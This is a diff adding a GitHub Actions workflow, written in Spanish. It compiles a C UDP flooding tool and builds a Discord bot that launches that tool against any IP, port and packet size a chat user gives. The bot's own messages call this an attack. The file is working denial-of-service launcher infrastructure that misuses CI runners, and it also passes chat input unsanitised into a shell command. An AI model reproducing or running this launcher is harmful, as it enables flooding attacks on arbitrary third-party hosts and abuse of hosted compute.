@@ -1,0 +1,92 @@
+name: C UDP Discord Bot
+
+on:
+  workflow_dispatch:
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Instalar dependencias
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y gcc python3-pip
+          pip3 install discord.py asyncio
+          echo "Dependencias instaladas"
+      
+      - name: Clonar repositorio
+        run: |
+          git clone https://github.com/feloxgarcia0-stack/UDP2.git
+          cd UDP2
+          echo "Repositorio clonado"
+      
+      - name: Compilar código C
+        run: |
+          cd UDP2
+          gcc -O3 -march=native -pthread udp_max_fixed.c -o udp_max
+          echo "Código C compilado"
+      
+      - name: Crear bot Python
+        run: |
+          cd UDP2
+          echo "import discord" > bot.py
+          echo "import asyncio" >> bot.py
+          echo "import subprocess" >> bot.py
+          echo "import os" >> bot.py
+          echo "import threading" >> bot.py
+          echo "" >> bot.py
+          echo "intents = discord.Intents.default()" >> bot.py
+          echo "intents.message_content = True" >> bot.py
+          echo "client = discord.Client(intents=intents)" >> bot.py
+          echo "" >> bot.py
+          echo "c_process = None" >> bot.py
+          echo "" >> bot.py
+          echo "@client.event" >> bot.py
+          echo "async def on_ready():" >> bot.py
+          echo "    print(f'Bot conectado como {client.user}')" >> bot.py
+          echo "" >> bot.py
+          echo "@client.event" >> bot.py
+          echo "async def on_message(message):" >> bot.py
+          echo "    global c_process" >> bot.py
+          echo "    " >> bot.py
+          echo "    if message.author == client.user:" >> bot.py
+          echo "        return" >> bot.py
+          echo "    " >> bot.py
+          echo "    content = message.content" >> bot.py
+          echo "    " >> bot.py
+          echo "    if content == '.c help':" >> bot.py
+          echo "        help_text = 'Comandos: .c direct IP PUERTO TAMAÑO - .c detener (para el ataque)'" >> bot.py
+          echo "        await message.channel.send(help_text)" >> bot.py
+          echo "    " >> bot.py
+          echo "    elif content.startswith('.c direct '):" >> bot.py
+          echo "        args = content.split()[2:]" >> bot.py
+          echo "        if len(args) >= 3:" >> bot.py
+          echo "            ip, port, size = args[0], args[1], args[2]" >> bot.py
+          echo "            " >> bot.py
+          echo "            c_cmd = f'sudo ./udp_max {ip} {port} {size}'" >> bot.py
+          echo "            await message.channel.send(f'Ejecutando: {c_cmd}')" >> bot.py
+          echo "            " >> bot.py
+          echo "            def run_c():" >> bot.py
+          echo "                global c_process" >> bot.py
+          echo "                c_process = subprocess.Popen(c_cmd, shell=True)" >> bot.py
+          echo "                c_process.wait()" >> bot.py
+          echo "            " >> bot.py
+          echo "            thread = threading.Thread(target=run_c)" >> bot.py
+          echo "            thread.start()" >> bot.py
+          echo "            await message.channel.send('Ataque C iniciado')" >> bot.py
+          echo "        else:" >> bot.py
+          echo "            await message.channel.send('Uso: .c direct IP PUERTO TAMAÑO')" >> bot.py
+          echo "    " >> bot.py
+          echo "    elif content == '.c detener':" >> bot.py
+          echo "        subprocess.run(['pkill', '-f', 'udp_max'])" >> bot.py
+          echo "        c_process = None" >> bot.py
+          echo "        await message.channel.send('Ataque C detenido completamente')" >> bot.py
+          echo "" >> bot.py
+          echo "client.run('${{ secrets.BOT_DC }}')" >> bot.py
+          echo "Bot Python creado"
+      
+      - name: Ejecutar bot
+        run: |
+          cd UDP2
+          echo "Iniciando bot de Discord para control C..."
+          timeout 21600 python3 bot.py || echo "Tiempo completado"
